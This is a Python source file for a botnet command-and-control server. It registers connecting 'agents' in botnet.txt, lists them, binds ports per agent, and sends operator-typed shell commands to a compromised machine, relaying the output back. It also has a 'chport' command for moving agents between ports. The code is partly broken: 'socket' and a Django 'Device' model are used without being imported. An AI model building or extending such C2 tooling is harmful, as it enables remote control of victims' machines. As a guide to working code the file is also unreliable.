import os, sys


def screenshot_addr_init(file_path, addr):
    pass


def append_new_ip(file_path, unique_addr):
    try:
        # Open the file in append mode
        with open(file_path, 'a+') as file:
            file.seek(0)
            existing_content = file.read().strip()
            if not Device.objects.filter(ip=unique_addr).exists:
                device = Device.objects.create(ip=unique_addr)

            if unique_addr not in existing_content:
                while True:
                    usr = input("[*] Add a Name for this Agent: ")
                    if usr not in existing_content:
                        if usr.strip() == "":
                            usr = unique_addr    

                        print(f'\n[+] Agent "{unique_addr}" added as "{usr}" to botnet on Port "8888"\n')
                        #8888 is default, enable multi channel with chport command inside an agent
                        file.seek(0, 2)
                        file.write(unique_addr + " " + usr + " 8888" + "\n")
                        break
                    
                    else: print("\n[!] Invalid Input.\n")                    

    except FileNotFoundError:
        with open(file_path, 'w') as file:
            file.write(unique_addr + '\n')
    
    #if os.path.exists("screenshot")
    #with open("screenshot/" + unique_addr + ".txt")


def commands(s, conn, ip, port, username): #input server commands to agent
    print("[i] Ctrl + C to close C2, 'quit' to end connection with current Agent.\n")
    cwd = conn.recv(BUFFER).decode()#bytes to str
    print(f"$> {cwd}", end = "")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(BUFFER)
                print(data.decode("utf-8"), end="")
            if cmd.lower().strip() == "quit":
                print(f'\n[x] Cutting connection with "{username}" {ip}')
                break
            elif cmd == []:
                continue

    #this is a server to agent command!!!
            elif cmd.lower().split()[0] == "chport":
            
                with open ("botnet.txt", 'r+') as file:
                    read = file.readlines()
                    for line in range(len(read)):
                        if ip in read[line]: #se l'ip è nella riga
                            newline = read[line].replace(str(port), cmd.lower().split()[1])
                            read.remove(read[line])
                            read.append(str(newline))
                            break
                        
                with open("botnet.txt", "w+") as fu:
                    fu.writelines(read)
                    break           
        except KeyboardInterrupt: 
            print("User Keyboard Interrupt")
            conn.close()
            s.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            s.close()
            sys.exit()


def bot_list():
    
    try:
        with open("botnet.txt", "r+") as file:
            print("\nIP" + " "*15 + "USERNAME" + " "*9 + "PORT")
            print("==" + " "*15 + "========" + " "*9 + "====")
            for line in file:
                #(f"LINE = [{line}]")
                if line.strip()!= "":
                    ip, username, port = line.strip().split()
                    formatted_text = "{:<16} {:<16} {}".format(ip, username, port)
                    print(formatted_text)

    except FileNotFoundError as e:
        print(e)


def server_comms():
    print("\nPress help for a list of commands")
    while True:
        comm = input("\n$$> ").lower().strip().split()
        if comm[0] == "help":
            print("\nList of C2 commands: \n\tBind\n\tBind [Username|Port]    Connect using an Agent Username or opening a Port \n\tList\t\t   List Of Agents Info\n\tHelp\t\t   Show this\n\tQuit\t\t   Leave")
            #print("\n")
        elif comm[0] == "list":
            bot_list()
        elif comm[0] == "quit":
            print("\n[x] Shutting server")
            sys.exit()
            
        elif comm[0] == "bind":
            try:
                with open("botnet.txt", 'r') as f:
                    for line in f:
                        if line.strip()!= "":
                            if comm[1] in line:
                                return (int(line.split()[2]), comm[1])
                    print("\n[x] Error: Username Not found")
                    #print("\n$$> ")
            except FileNotFoundError as e:
                print("\n[!] " + str(e))
            except Exception as e:
                print('[x] "Bind" command needs an argument. ')


def agent_ip(name):
    try:
        with open("botnet.txt", 'r') as file:
            for line in file:
                if name in line:
                    return line.split()[0]
    except FileNotFoundError as e:
        print("\n[!] " + str(e))
    except Exception as e:
        print("\n[!] " + str(e))


def server(host):
    #initialize socket and wait for connection
    while True:
        out = server_comms()
        port = out[0]
        name = out[1]
        address = (host, port)
        try:
            s = socket.socket()#create socket object
            s.bind(address) #link socket with address
            s.listen() #listen....
            print(f"\n[*] Server has been initialized. Listening on port: {address[1]}\n")
        except Exception as e:
            print("\n[x] Something went wrong...")
            print(e)
            while True:
                restart = input("\n[?] Do you want to reinitialize you server? y/n\n")
                if restart.lower().strip() == "y":
                    print("\n[*] Reinitializing Server...")
                    server(host)
                    break
                elif restart.lower().strip() == 'n':
                    print("\n[x] Shutting server")
                    sys.exit(0)
                    
                else:
                    print("\n[!] Invalid input. Try again.")
                    

        conn, client_addr = s.accept() #returns tuple: client socket and client address
        append_new_ip("botnet.txt", client_addr[0]) #add element to botnet
        if client_addr[0] != agent_ip(name):
                print("[!] Invalid Agent is trying to connect. Redirecting to C2 Server bash.")
                conn.close() #then close socket 
                s.close() #close connection -> reopen port on server side
                continue

        print(f'[+] Connected with "{name}" {client_addr} \n')
        commands(s, conn, client_addr[0], address[1], name) #receive commands
        conn.close() #then close socket 
        s.close() #close connection -> reopen port on server side


            

if __name__ == "__main__":
    bot_list()
    host = "127.0.0.1"
    #port = input("[*] Select Port to Open: ")
    port = 8888
    BUFFER = 4096
    print("\nWelcome to C2 Server")
    server(host)
